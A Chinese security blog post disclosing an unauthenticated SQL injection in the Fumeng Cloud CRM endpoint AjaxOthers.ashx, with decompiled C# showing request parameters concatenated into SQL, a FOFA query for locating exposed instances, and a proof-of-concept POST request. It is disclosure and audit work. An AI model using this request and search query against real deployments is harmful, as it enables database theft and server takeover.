---
title: "孚盟云CRM AjaxOthers.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxOthers-sqli.html
asset_dir: assets/孚盟云crm-ajaxothers.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxOthers.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/23 08:31
- 274浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

SQL

app

客户关系管理

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxOthers.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"
>
> SQL注入防护

# 漏洞分析

直接看 `AjaxOthers.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxOthers** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str = context.Request["action"];
  if (!string.IsNullOrEmpty(UserCookie.GetCookieValue("empId")))
  {
    this.userId = UserCookie.GetCookieValue("empId");
    this.userId = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(this.userId);
  }
  else
    context.Response.Write("-1");
  string s = str;
  // ISSUE: reference to a compiler-generated method
  switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(s))
  {
    case 915526031:
      if (!string.op_Equality(s, "saveFeedBack"))
        break;
      this.saveFeedBack(context);
      break;
    case 943109687:
      if (!string.op_Equality(s, "deletePerson"))
        break;
      this.deletePerson(context);
      break;
    case 1450188932:
      if (!string.op_Equality(s, "getDepartHtml"))
        break;
      this.getDepartHtml(context);
      break;
    case 1493573425:
      if (!string.op_Equality(s, "getPersonCount"))
        break;
      this.getPersonCount(context);
      break;
    case 2901096358:
      if (!string.op_Equality(s, "GetCheckRepeatData"))
        break;
      this.GetCheckRepeatData(context);
      break;
    case 3002226797:
      if (!string.op_Equality(s, "savePerson"))
        break;
      this.savePerson(context);
      break;
    case 4085212745:
      if (!string.op_Equality(s, "deletePersonCookie"))
        break;
      this.deletePersonCookie(context);
      break;
  }
}
```

深入探索

数据库

身份验证

应用程序

当**action=GetCheckRepeatData**时，进入`GetCheckRepeatData`方法

```
private void GetCheckRepeatData(HttpContext context)
{
  string str1 = string.IsNullOrEmpty(context.Request["field"]) ? "BriefName" : context.Request["field"];
  string str2 = string.IsNullOrEmpty(context.Request["tableName"]) ? "bfCustomers" : context.Request["tableName"];
  string str3 = context.Request["searchVal"];
  string str4 = context.Request["type"];
  string str5 = context.Request["sqlwhere"];
  string str6 = "";
  if (string.op_Equality(str4, "customer"))
  {
    string cookieValue = UserCookie.GetCookieValue("corpId");
    if (string.IsNullOrEmpty(ConfigurationManager.AppSettings["CheckRepeat"]))
    {
      if (!string.IsNullOrEmpty(str3))
      {
        string SQLString = $"select top 10 * from {str2} where {str1} like '%{str3}%'";
        if (!string.IsNullOrEmpty(str5))
          SQLString = $"{SQLString} and {str5}";
        DataSet dataSet = new DbHelperSql(cookieValue).Query(SQLString);
        if (dataSet != null)
```

当**type=customer**时，参数**searchVal**被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxOthers.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

action=GetCheckRepeatData&searchVal=SQLI_POC&type=customer
```

[![孚盟云CRM AjaxOthers.ashx SQL注入漏洞](images/img-001-2c77aa84e24e.webp)](https://image.mrxn.net/c8fbb2c06d934aabbe201ac8a0afc6f2.webp)

成功延时 4 秒

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
